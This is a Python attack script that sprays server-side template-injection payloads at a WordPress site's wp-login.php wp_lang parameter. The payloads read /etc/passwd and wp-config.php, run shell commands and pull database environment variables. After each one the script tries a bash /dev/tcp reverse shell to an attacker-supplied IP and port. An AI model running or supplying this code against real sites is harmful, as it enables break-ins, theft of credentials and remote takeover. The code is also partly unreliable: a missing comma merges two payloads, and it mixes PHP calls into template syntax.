import requests
import sys
from termcolor import colored

def print_colored(message, color):
    print(colored(message, color))

def prompt_for_url():
    return input("Enter the base URL or IP address of the WordPress website (e.g., http://your-website.com): ").strip()

def prompt_for_reverse_shell_details():
    ip = input("Enter your reverse shell listener IP address: ").strip()
    port = input("Enter your reverse shell listener port: ").strip()
    return ip, port

def log_results(payload, response):
    log_path = 'exploit_results.log'
    with open(log_path, 'a') as log_file:
        log_file.write(f"Testing payload: {payload}\n")
        log_file.write(f"Response status code: {response.status_code}\n")
        log_file.write(f"Response content:\n{response.text}\n\n")

def test_ssti(base_url, payloads, reverse_shell_ip, reverse_shell_port):
    for payload in payloads:
        try:
            url = f"{base_url}/wp-login.php?wp_lang={payload}"
            print_colored(f"Sending request to: {url}", 'cyan')
            response = requests.get(url)

            log_results(payload, response)

            if response.status_code == 200:
                print_colored(f"Payload: {payload}", 'blue')
                if any(keyword in response.text.lower() for keyword in ["id", "uid", "user", "username", "success", "passwd", "password", "db", "config"]):
                    print_colored(f"Potential exploit detected with payload: {payload}", 'red')
                else:
                    print_colored(f"Payload result:\n{response.text}\n", 'green')
            else:
                print_colored(f"Received non-200 status code: {response.status_code}", 'yellow')

        except requests.RequestException as e:
            print_colored(f"Request failed: {e}", 'red')

        # Attempt reverse shell injection if payload allows it
        reverse_shell_payload = f"{{{{ system('bash -i >& /dev/tcp/{reverse_shell_ip}/{reverse_shell_port} 0>&1') }}}}"
        try:
            reverse_shell_url = f"{base_url}/wp-login.php?wp_lang={reverse_shell_payload}"
            print_colored(f"Attempting reverse shell with payload: {reverse_shell_payload}", 'magenta')
            response = requests.get(reverse_shell_url)
            log_results(reverse_shell_payload, response)
            
            if response.status_code == 200:
                print_colored(f"Reverse shell attempt status: {response.status_code}", 'cyan')
            else:
                print_colored(f"Reverse shell attempt failed with status code: {response.status_code}", 'red')

        except requests.RequestException as e:
            print_colored(f"Reverse shell request failed: {e}", 'red')

def main():
    base_url = prompt_for_url()
    reverse_shell_ip, reverse_shell_port = prompt_for_reverse_shell_details()

    # List of SSTI payloads
    ssti_payloads = [
        "{{ 7 * 7 }}",                            # Simple expression
        "{{ config }}"                           # Attempt to retrieve configuration
        "{{ self.__class__.__mro__[1].__subclasses__() }}",  # Retrieve classes
        "{{ ''.__class__.__mro__[1].__subclasses__()[40]('id').read() }}",  # Read command output
        "{{ system('id') }}",                     # Execute command
        "{{ exec('id') }}",                       # Execute command
        "{{ import('os').system('id') }}",        # Execute command with import
        "{{ ''.join(__import__('os').popen('id').read()) }}",  # Command execution
        "{{ ''.__class__.__mro__[1].__subclasses__()[40]('id').read() }}",  # Read command output
        "{{ system('ls') }}",                     # List directory
        "{{ exec('ls') }}",                       # List directory
        "{{ passthru('ls') }}",                   # List directory
        "{{ shell_exec('ls') }}",                 # List directory
        "{{ include('/etc/passwd') }}",           # Include file
        "{{ require('/etc/passwd') }}",           # Require file
        "{{ include('wp-config.php') }}",         # Include WordPress config
        "{{ require('wp-config.php') }}",         # Require WordPress config
        "{{ file_get_contents('/etc/passwd') }}", # Read file contents
        "{{ file_get_contents('wp-config.php') }}", # Read file contents
        "{{ getenv('DB_NAME') }}",                # Get environment variable
        "{{ getenv('DB_HOST') }}",                # Get environment variable
    ]

    print_colored("Starting SSTI vulnerability testing...", 'cyan')
    test_ssti(base_url, ssti_payloads, reverse_shell_ip, reverse_shell_port)

    print_colored("Testing completed.", 'magenta')

if __name__ == "__main__":
    main()
